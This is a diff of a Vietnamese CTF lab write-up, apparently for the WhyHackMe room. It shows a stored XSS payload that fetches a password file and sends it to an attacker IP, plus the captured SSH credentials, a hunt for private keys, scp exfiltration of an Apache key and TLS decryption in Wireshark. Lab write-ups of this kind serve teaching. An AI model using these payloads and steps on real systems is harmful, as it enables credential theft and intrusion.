@@ -34,26 +34,72 @@ thì sau khi đăng nhập trang blog hiển thị bình luận sau
 
 <img width="1265" height="773" alt="image" src="https://github.com/user-attachments/assets/ece3ce5b-0cad-4278-91a5-664c72459fb7" />
 
-sau khi thử các mẫu XSS thành công tôi sẽ tạo 1 tập lệnh để lấy tệp pass.txt
+tôi quay lại trang register đăng ký tên người dùng là <script>alert(1)</script> và mật khẩu bất kỳ 
 
-đầu tiên tôi khởi chạy python3 -m http.server 8000
+sau đó đăng nhập vào blog viết 1 bình luận bất kỳ và nó hiển thị : 
 
-sau khi tham khảo các nguồn gợi ý thì có tập lệnh XSS như này 
+<img width="1273" height="648" alt="image" src="https://github.com/user-attachments/assets/388ffc94-2bef-400d-95a6-283364d0de9f" />
 
-fetch('http://127.0.0.1/dir/pass.txt')
+điều này xác nhập là có thể tấn công qua lỗ hổng XSS
+ 
+tôi tham khảo được lệnh XSS này 
 
-  .then(response => response.text())
-  
-  .then(data => {
-  
-    let attackerServer = 'http://10.14.108.226:8000/catch?data=' + encodeURIComponent(data);
-    
-    // Use an Image tag for GET request
-    
-    let img = document.createElement('img');
-    
-    img.src = attackerServer;
-    
-    document.body.appendChild(img);
-    
-  });
+<script>fetch("http://127.0.0.1/dir/pass.txt").then(response => response.text()).then(data => fetch("http://10.14.108.226:8080/?data=" + encodeURIComponent(data)));</script>
+
+dùng nó đăng ký tên đăng nhập với mật khẩu bất kỳ 
+
+khởi chạy
+
+└─$ python3 -m http.server 8080
+
+sau đó bình luận trên trang blog 
+
+<img width="904" height="169" alt="image" src="https://github.com/user-attachments/assets/6dfab6e8-8c00-4b46-b603-e68745b1af94" />
+
+tôi nhận được dữ liệu dường như nó là username và password
+
+jack:WhyIsMyPasswordSoStrongIDK
+
+tôi dùng nó để đăng nhập ssh thành công sau đó cờ người dùng ngay vị trí hiện tại
+
+<img width="853" height="648" alt="image" src="https://github.com/user-attachments/assets/92204417-8383-4a25-a2c0-4fe00adbe036" />
+
+sau đó tôi tìm cách leo quyền 
+
+<img width="908" height="348" alt="image" src="https://github.com/user-attachments/assets/641bf96d-eccc-4f9d-985b-4618bad931a1" />
+
+có dịch vụ hoạt động trên cổng 41312
+
+tôi đã cố truy cập nhưng không thành công 
+
+<img width="1271" height="283" alt="image" src="https://github.com/user-attachments/assets/6cb0b857-2f79-435d-8231-45abad414846" />
+
+ở thư mục /opt ta có 2 file thú vị 
+
+lấy file pcap về máy kali tôi 
+
+scp capture.pcap doankhanh@10.14.108.226:/home/doankhanh/Documents/WhyHackMe
+
+<img width="1245" height="150" alt="image" src="https://github.com/user-attachments/assets/5704ff12-ecff-4535-bf85-6a1ce726acb7" />
+
+<img width="1256" height="782" alt="image" src="https://github.com/user-attachments/assets/3277d6d1-ac7d-4c6f-b3e6-793b13e14ef6" />
+
+sau khi bật wireshark lên xem nhưng nội dung đã bị mã hóa nên tôi dùng cách khác 
+
+sử dụng lệnh 
+
+find / -type f -name "*.key" 2>/dev/null
+
+và thấy được đường dẫn lưu trữ khóa 
+
+/etc/apache2/certs/apache.key
+
+đưa nó về máy của tôi 
+
+scp /etc/apache2/certs/apache.key doankhanh@10.14.108.226:/home/doankhanh/Documents/WhyHackMe
+
+quay lại wireshark và điều hướng đến Edit -> Prefernces -> TLS
+
+vào tùy chọn edit trong RSA Keys List và nhập IP, cổng, giao thức và vị trí của khóa vừa lấy về 
+
+<img width="1264" height="800" alt="image" src="https://github.com/user-attachments/assets/3a123d12-bb45-4ced-8b4c-71bf68e5ab42" />
